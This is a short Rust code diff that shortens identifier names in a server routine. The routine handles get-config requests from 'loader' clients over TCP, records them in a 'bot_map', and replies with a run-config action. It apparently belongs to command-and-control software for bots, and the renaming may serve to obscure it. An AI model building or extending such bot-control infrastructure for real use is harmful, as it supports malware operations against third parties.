@@ -1,8 +1,8 @@
 use std::sync::Arc;
 use chrono::Utc;
 use loader_vars::types::{
-    receive::{ ClientAction, ClientParams, RunConfigParams },
-    send::{ LoaderSendPayload, ServerAction, ServerParams },
+    receive::{ ClAct, ClPrms, RnCnfgPrms },
+    send::{ LdrSnd, SrvAct, SrvPrms },
 };
 use tokio::{ net::TcpStream, sync::Mutex };
 use anyhow::Result;
@@ -13,20 +13,20 @@ use crate::server::{
 
 pub async fn route_loader(
     handler: &ServerHandler,
-    payload: LoaderSendPayload,
+    payload: LdrSnd,
     stream_ref: Arc<Mutex<TcpStream>>
 ) -> Result<()> {
     match payload.action {
-        ServerAction::GetConfig => { init(handler, payload, stream_ref).await }
+        SrvAct::GtCnfg => { init(handler, payload, stream_ref).await }
     }
 }
 
 pub async fn init(
     handler: &ServerHandler,
-    payload: LoaderSendPayload,
+    payload: LdrSnd,
     stream_ref: Arc<Mutex<TcpStream>>
 ) -> Result<()> {
-    if let ServerParams::GetConfig(params) = payload.params {
+    if let SrvPrms::GtCnfg(params) = payload.params {
         verify_loader_get_config(&params)?;
 
         let mut bot_map = handler.bot_map.write().await;
@@ -47,8 +47,8 @@ pub async fn init(
         drop(bot_map);
         ServerHandler::send_action_to_loader(
             stream_ref,
-            ClientAction::RunConfig,
-            ClientParams::RunConfig(RunConfigParams::default())
+            ClAct::RnCnfg,
+            ClPrms::RnCnfg(RnCnfgPrms::default())
         ).await
     } else {
         return Err(anyhow::anyhow!(format!("Invalid params for: {:#?}", payload.action)));
